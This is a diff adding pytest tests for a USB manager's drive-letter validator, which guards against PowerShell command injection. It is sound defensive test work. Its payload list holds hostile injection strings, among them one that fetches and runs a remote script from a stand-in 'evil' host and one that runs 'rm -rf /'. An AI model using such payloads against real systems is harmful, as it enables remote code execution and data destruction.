@@ -257,3 +257,51 @@ class TestLockedSync:
         with locked_sync(tmp_path):
             assert lock.exists()  # fresh lock now belongs to us
         assert not lock.exists()
+
+
+# ---------------------------------------------------------------------------
+# Drive-letter validation (command-injection guard)
+# ---------------------------------------------------------------------------
+
+class TestDriveLetterValidation:
+    """`UsbActions.eject` / `.format_drive` splice the drive into a PowerShell
+    command string. The old `rstrip("\\").rstrip(":")` left quotes, semicolons
+    and `#` intact, so a crafted `drive` escaped `ParseName('{d}:')` and ran
+    arbitrary code as the desktop user. Only a single ASCII letter may pass."""
+
+    @pytest.mark.parametrize(
+        "raw,expected",
+        [
+            ("E", "E"),
+            ("e:", "E"),
+            ("F:\\", "F"),
+            ("  g:  ", "G"),
+        ],
+    )
+    def test_accepts_real_drive_letters(self, raw: str, expected: str) -> None:
+        assert usb_manager._drive_letter(raw) == expected
+
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "E'); Start-Process calc; #",
+            "E'); iwr http://evil/x.ps1|iex; #",
+            "E; rm -rf /",
+            "E`; calc",
+            "EE",
+            "../..",
+            "",
+        ],
+    )
+    def test_rejects_injection_payloads(self, payload: str) -> None:
+        assert usb_manager._drive_letter(payload) is None
+
+    def test_eject_refuses_injection_without_spawning_powershell(self, monkeypatch) -> None:
+        """The guard must reject *before* subprocess.run is reached."""
+        calls = []
+        monkeypatch.setattr(
+            usb_manager.subprocess, "run", lambda *a, **k: calls.append(a) or None
+        )
+        result = usb_manager.UsbActions.eject("E'); Start-Process calc; #")
+        assert result["status"] == "error"
+        assert calls == []
